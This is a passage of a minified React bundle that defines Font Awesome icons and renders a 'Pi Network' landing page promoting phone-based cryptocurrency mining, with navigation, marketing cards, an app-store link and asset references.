        pull: null,
        pulse: !1,
        rotation: null,
        size: null,
        spin: !1,
        spinPulse: !1,
        spinReverse: !1,
        beat: !1,
        fade: !1,
        beatFade: !1,
        bounce: !1,
        shake: !1,
        symbol: !1,
        title: "",
        titleId: null,
        transform: null,
        swapOpacity: !1
    },
    le = sa.forwardRef(function(e, t) {
        var n = Ge(Ge({}, Ec), e),
            r = n.icon,
            i = n.mask,
            a = n.symbol,
            l = n.className,
            o = n.title,
            s = n.titleId,
            u = n.maskId,
            f = Sc(r),
            m = cl("classes", [].concat(xo(M0(n)), xo((l || "").split(" ")))),
            v = cl("transform", typeof n.transform == "string" ? ko.transform(n.transform) : n.transform),
            g = cl("mask", Sc(i)),
            w = C0(f, Ge(Ge(Ge(Ge({}, m), v), g), {}, {
                symbol: a,
                title: o,
                titleId: s,
                maskId: u
            }));
        if (!w) return B0("Could not find icon", f), null;
        var k = w.abstract,
            E = {
                ref: t
            };
        return Object.keys(n).forEach(function(p) {
            Ec.hasOwnProperty(p) || (E[p] = n[p])
        }), H0(k[0], E)
    });
le.displayName = "FontAwesomeIcon";
le.propTypes = {
    beat: R.bool,
    border: R.bool,
    beatFade: R.bool,
    bounce: R.bool,
    className: R.string,
    fade: R.bool,
    flash: R.bool,
    mask: R.oneOfType([R.object, R.array, R.string]),
    maskId: R.string,
    fixedWidth: R.bool,
    inverse: R.bool,
    flip: R.oneOf([!0, !1, "horizontal", "vertical", "both"]),
    icon: R.oneOfType([R.object, R.array, R.string]),
    listItem: R.bool,
    pull: R.oneOf(["right", "left"]),
    pulse: R.bool,
    rotation: R.oneOf([0, 90, 180, 270]),
    shake: R.bool,
    size: R.oneOf(["2xs", "xs", "sm", "lg", "xl", "2xl", "1x", "2x", "3x", "4x", "5x", "6x", "7x", "8x", "9x", "10x"]),
    spin: R.bool,
    spinPulse: R.bool,
    spinReverse: R.bool,
    symbol: R.oneOfType([R.bool, R.string]),
    title: R.string,
    titleId: R.string,
    transform: R.oneOfType([R.string, R.object]),
    swapOpacity: R.bool
};
var H0 = Pp.bind(null, sa.createElement),
    V0 = {
        prefix: "fas",
        iconName: "globe",
        icon: [512, 512, [127760], "f0ac", "M352 256c0 22.2-1.2 43.6-3.3 64H163.3c-2.2-20.4-3.3-41.8-3.3-64s1.2-43.6 3.3-64H348.7c2.2 20.4 3.3 41.8 3.3 64zm28.8-64H503.9c5.3 20.5 8.1 41.9 8.1 64s-2.8 43.5-8.1 64H380.8c2.1-20.6 3.2-42 3.2-64s-1.1-43.4-3.2-64zm112.6-32H376.7c-10-63.9-29.8-117.4-55.3-151.6c78.3 20.7 142 77.5 171.9 151.6zm-149.1 0H167.7c6.1-36.4 15.5-68.6 27-94.7c10.5-23.6 22.2-40.7 33.5-51.5C239.4 3.2 248.7 0 256 0s16.6 3.2 27.8 13.8c11.3 10.8 23 27.9 33.5 51.5c11.6 26 20.9 58.2 27 94.7zm-209 0H18.6C48.6 85.9 112.2 29.1 190.6 8.4C165.1 42.6 145.3 96.1 135.3 160zM8.1 192H131.2c-2.1 20.6-3.2 42-3.2 64s1.1 43.4 3.2 64H8.1C2.8 299.5 0 278.1 0 256s2.8-43.5 8.1-64zM194.7 446.6c-11.6-26-20.9-58.2-27-94.6H344.3c-6.1 36.4-15.5 68.6-27 94.6c-10.5 23.6-22.2 40.7-33.5 51.5C272.6 508.8 263.3 512 256 512s-16.6-3.2-27.8-13.8c-11.3-10.8-23-27.9-33.5-51.5zM135.3 352c10 63.9 29.8 117.4 55.3 151.6C112.2 482.9 48.6 426.1 18.6 352H135.3zm358.1 0c-30 74.1-93.6 130.9-171.9 151.6c25.5-34.2 45.2-87.7 55.3-151.6H493.4z"]
    },
    W0 = {
        prefix: "fas",
        iconName: "arrow-right",
        icon: [448, 512, [8594], "f061", "M438.6 278.6c12.5-12.5 12.5-32.8 0-45.3l-160-160c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L338.8 224 32 224c-17.7 0-32 14.3-32 32s14.3 32 32 32l306.7 0L233.4 393.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l160-160z"]
    },
    Cc = {
        prefix: "fas",
        iconName: "angle-down",
        icon: [448, 512, [8964], "f107", "M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z"]
    },
    Q0 = {
        prefix: "fas",
        iconName: "magnifying-glass",
        icon: [512, 512, [128269, "search"], "f002", "M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352a144 144 0 1 0 0-288 144 144 0 1 0 0 288z"]
    },
    Y0 = {
        prefix: "fas",
        iconName: "computer",
        icon: [640, 512, [], "e4e5", "M384 96V320H64L64 96H384zM64 32C28.7 32 0 60.7 0 96V320c0 35.3 28.7 64 64 64H181.3l-10.7 32H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H352c17.7 0 32-14.3 32-32s-14.3-32-32-32H277.3l-10.7-32H384c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H64zm464 0c-26.5 0-48 21.5-48 48V432c0 26.5 21.5 48 48 48h64c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48H528zm16 64h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16s7.2-16 16-16zm-16 80c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16s-7.2 16-16 16H544c-8.8 0-16-7.2-16-16zm32 160a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"]
    },
    K0 = {
        prefix: "fas",
        iconName: "check",
        icon: [448, 512, [10003, 10004], "f00c", "M438.6 105.4c12.5 12.5 12.5 32.8 0 45.3l-256 256c-12.5 12.5-32.8 12.5-45.3 0l-128-128c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0L160 338.7 393.4 105.4c12.5-12.5 32.8-12.5 45.3 0z"]
    };
const G0 = "/assets/pi-phone-f0cce320.webp",
    Z0 = "/assets/pi_pic2-5a5611f0.png",
    X0 = "/assets/pi_adpic1-66f1d0e2.webp",
    J0 = "/assets/google_playpic-11a61402.webp",
    q0 = "/assets/pisign-a3ea5395.webp";
var $0 = {
        prefix: "fab",
        iconName: "instagram",
        icon: [448, 512, [], "f16d", "M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"]
    },
    eg = {
        prefix: "fab",
        iconName: "facebook",
        icon: [512, 512, [62e3], "f09a", "M512 256C512 114.6 397.4 0 256 0S0 114.6 0 256C0 376 82.7 476.8 194.2 504.5V334.2H141.4V256h52.8V222.3c0-87.1 39.4-127.5 125-127.5c16.2 0 44.2 3.2 55.7 6.4V172c-6-.6-16.5-1-29.6-1c-42 0-58.2 15.9-58.2 57.2V256h83.6l-14.4 78.2H287V510.1C413.8 494.8 512 386.9 512 256h0z"]
    },
    tg = {
        prefix: "fab",
        iconName: "youtube",
        icon: [576, 512, [61802], "f167", "M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"]
    },
    ng = {
        prefix: "fab",
        iconName: "twitter",
        icon: [512, 512, [], "f099", "M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"]
    },
    Ap = {};
(function(e) {
    Object.defineProperty(e, "__esModule", {
        value: !0
    });
    var t = "fas",
        n = "bars",
        r = 448,
        i = 512,
        a = ["navicon"],
        l = "f0c9",
        o = "M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z";
    e.definition = {
        prefix: t,
        iconName: n,
        icon: [r, i, a, l, o]
    }, e.faBars = e.definition, e.prefix = t, e.iconName = n, e.width = r, e.height = i, e.ligatures = a, e.unicode = l, e.svgPathData = o, e.aliases = a
})(Ap);
var Ip = {};
(function(e) {
    Object.defineProperty(e, "__esModule", {
        value: !0
    });
    var t = "fas",
        n = "spinner",
        r = 512,
        i = 512,
        a = [],
        l = "f110",
        o = "M304 48a48 48 0 1 0 -96 0 48 48 0 1 0 96 0zm0 416a48 48 0 1 0 -96 0 48 48 0 1 0 96 0zM48 304a48 48 0 1 0 0-96 48 48 0 1 0 0 96zm464-48a48 48 0 1 0 -96 0 48 48 0 1 0 96 0zM142.9 437A48 48 0 1 0 75 369.1 48 48 0 1 0 142.9 437zm0-294.2A48 48 0 1 0 75 75a48 48 0 1 0 67.9 67.9zM369.1 437A48 48 0 1 0 437 369.1 48 48 0 1 0 369.1 437z";
    e.definition = {
        prefix: t,
        iconName: n,
        icon: [r, i, a, l, o]
    }, e.faSpinner = e.definition, e.prefix = t, e.iconName = n, e.width = r, e.height = i, e.ligatures = a, e.unicode = l, e.svgPathData = o, e.aliases = a
})(Ip);

function rg() {
    return d.jsx("div", {
        className: "home-divs",
        children: d.jsx("div", {
            className: "home",
            children: d.jsx("div", {
                id: "root",
                children: d.jsxs("div", {
                    className: "App",
                    children: [d.jsxs("div", {
                        className: "navbar",
                        children: [d.jsx("div", {
                            className: "brandname",
                            children: "Pi Network"
                        }), d.jsxs("ul", {
                            className: "expanded",
                            children: [d.jsxs("li", {
                                children: [d.jsxs("a", {
                                    href: "https://minepi.com/pi-blockchain/",
                                    children: ["Pi Blockchain", d.jsx(le, {
                                        icon: Cc
                                    })]
                                }), d.jsx("hr", {})]
                            }), d.jsxs("li", {
                                children: [d.jsxs("a", {
                                    href: "https://minepi.com/developers/pi-hackathon/",
                                    children: ["Developers", d.jsx(le, {
                                        icon: Cc
                                    })]
                                }), d.jsx("hr", {})]
                            }), d.jsxs("li", {
                                children: [d.jsx("a", {
                                    href: "/",
                                    children: "About us"
                                }), d.jsx("hr", {})]
                            }), d.jsxs("li", {
                                children: [d.jsx("a", {
                                    href: "https://minepi.com/blog/",
                                    children: "Blog"
                                }), d.jsx("hr", {})]
                            }), d.jsxs("li", {
                                children: [d.jsx("a", {
                                    href: "https://minepi.com/support/",
                                    children: "Support"
                                }), d.jsx("hr", {})]
                            }), d.jsxs("li", {
                                className: "navlinks",
                                children: [d.jsx("a", {
                                    href: "https://twitter.com/PiCoreTeam",
                                    children: d.jsx(le, {
                                        icon: ng
                                    })
                                }), "  ", d.jsx("a", {
                                    href: "https://web.facebook.com/PiCoreTeam/?_rdc=1&_rdr",
                                    children: d.jsx(le, {
                                        icon: eg
                                    })
                                }), "  ", d.jsx("a", {
                                    href: "https://www.youtube.com/c/PiCoreTeam",
                                    children: d.jsx(le, {
                                        icon: tg
                                    })
                                }), "  ", d.jsx("a", {
                                    href: "https://www.instagram.com/pi_network/",
                                    children: d.jsx(le, {
                                        icon: $0
                                    })
                                })]
                            })]
                        }), d.jsxs("div", {
                            className: "queryarr",
                            children: [d.jsx(le, {
                                icon: Q0
                            }), d.jsx("button", {
                                className: "burgerbtn",
                                children: d.jsx(le, {
                                    icon: Ap.faBars,
                                    color: "gold"
                                })
                            })]
                        })]
                    }), d.jsxs("div", {
                        className: "components",
                        children: [d.jsxs("div", {
                            className: "banner-write-up",
                            children: [d.jsx("h1", {
                                children: "The First Digital Currency You Can Mine On Your  Phone"
                            }), d.jsx("p", {
                                children: "Start mining Pi cryptocurrency today with our free, energy-light mobile app! "
                            }), d.jsx("br", {}), d.jsx("button", {
                                children: d.jsxs("a", {
                                    href: "/home",
                                    children: ["Register for safe exchange", d.jsx(le, {
                                        className: "check",
                                        icon: K0
                                    })]
                                })
                            })]
                        }), d.jsx("div", {
                            className: "banner-pic",
                            children: d.jsx("img", {
                                src: G0,
                                alt: ""
                            })
                        })]
                    }), d.jsxs("div", {
                        className: "mid-writeup",
                        children: ["Mining crypto is hard ", d.jsx("br", {}), "Investing in crypto is risky ", d.jsx("br", {}), "Too many of us are left out of the ", d.jsx("br", {}), "cryptocurrency revolution..."]
                    }), d.jsxs("div", {
                        className: "section-two",
                        children: [d.jsxs("div", {
                            className: "sect2-write-up",
                            children: [d.jsx("h2", {
                                children: "Pi makes crypto mining easy."
                            }), d.jsx("p", {
                                children: "Breakthrough tech allows you to mine Pi on your phone without draining your battery"
                            }), d.jsxs("button", {
                                children: ["Learn The Tech Behind Pi  ", d.jsx(le, {
                                    icon: W0
                                })]
                            })]
                        }), d.jsx("div", {
                            className: "sect2-pic",
                            children: d.jsx("img", {
                                src: Z0,
                                alt: ""
                            })
                        })]
                    }), d.jsxs("div", {
                        className: "card-sect",
                        children: [d.jsxs("div", {
                            className: "card",
                            children: [d.jsx("div", {
                                className: "card-icon",
                                style: {
                                    color: "rgb(138, 52, 142)",
                                    marginBottom: "10%"
                                },
                                children: d.jsx(le, {
                                    icon: Ip.faSpinner
                                })
                            }), d.jsx("h4", {
                                children: "Decentralized"
                            }), d.jsx("p", {
                                children: "Secure, Immutable, non-counterfeitable and interoperable digital money."
                            })]
                        }), d.jsxs("div", {
                            className: "card",
                            children: [d.jsx("div", {
                                className: "card-icon",
                                style: {
                                    color: " rgb(138, 52, 142)",
                                    marginBottom: "10%"
                                },
                                children: d.jsx(le, {
                                    icon: Y0
                                })
                            }), d.jsx("h4", {
                                children: "Mobile First"
                            }), d.jsx("p", {
                                children: "Works on your mobile phone and does not drain your battery."
                            })]
                        }), d.jsxs("div", {
                            className: "card",
                            children: [d.jsx("div", {
                                className: "card-icon",
                                style: {
                                    color: "rgb(138, 52, 142)",
                                    marginBottom: "10%"
                                },
                                children: d.jsx(le, {
                                    icon: V0
                                })
                            }), d.jsx("h4", {
                                children: "User Planet Friendly"
                            }), d.jsx("p", {
                                children: "Easy to use, secure at scale, without the massive electrical waste."
                            })]
                        })]
                    }), d.jsxs("div", {
                        className: "ad",
                        children: [d.jsx("div", {
                            className: "ad-pic",
                            children: d.jsx("img", {
                                src: X0,
                                alt: ""
                            })
                        }), d.jsxs("div", {
                            className: "adtext",
                            children: [d.jsx("h4", {
                                children: "Download the mobile app to start mining today! Join now."
                            }), d.jsxs("p", {
                                children: ["Keep your money! Mining Pi is free.", d.jsx("br", {}), "All you need is an invitation from an existing trusted member on the network. If you have an invitation.", d.jsx("br", {}), "you can download the mobile app below."]
                            }), d.jsx("a", {
                                href: "https://play.google.com/store/apps/details?id=com.blockchainvault",
                                children: d.jsx("img", {
                                    src: J0,
                                    alt: ""
                                })
                            })]
                        })]
                    }), d.jsxs("footer", {
                        children: [d.jsxs("ul", {
                            className: "linksectone",
                            children: [d.jsx("li", {
                                children: "Pi Whitepaper"
                            }), d.jsx("li", {
                                children: "Support & FAQ"
                            }), d.jsx("li", {
                                children: "Terms of Service"
                            })]
                        }), d.jsxs("ul", {
                            className: "linksecttwo",
                            children: [d.jsx("li", {
                                children: "Privacy Policy"
                            }), d.jsx("li", {
                                children: "Developer Terms of Use"
                            }), d.jsx("li", {
                                children: "Pi Trademark"
                            })]
                        }), d.jsx("div", {
                            children: d.jsx("img", {
                                src: q0,
                                alt: ""
                            })
                        })]
                    })]
                })
            })
        })
    })
}
const Op = "/assets/pi_logo-746a5f99.png",
    ig = "/assets/fireside-736eeda9.webp",
    ag = "/assets/wallet-32ef219e.webp",
    lg = "/assets/brainstorm-b6711d75.webp",
    og = "data:image/webp;base64,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",
    sg = "/assets/blockchain-c5de89a7.webp",
